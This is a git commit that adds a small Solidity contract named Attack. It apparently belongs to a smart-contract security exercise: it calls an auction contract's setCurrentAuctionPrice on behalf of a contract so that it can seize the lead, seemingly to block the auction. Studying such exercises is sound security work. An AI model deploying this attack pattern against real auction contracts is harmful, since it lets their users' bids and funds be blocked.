945254897f082647eab92ff22c0e71c4dbd3768a
adriancr1 <adrian.casal.rodriguez@gmail.com>
2022-10-18 17:33:57 +0200

    first commit

---
+++ contracts/Attack.sol
@@ -0,0 +1,16 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.9;
+
+import "./Good.sol";
+
+contract Attack {
+    Good good;
+
+    constructor(address _good) {
+        good = Good(_good);
+    }
+
+    function attack() public payable {
+        good.setCurrentAuctionPrice{value: msg.value}();
+    }
+}
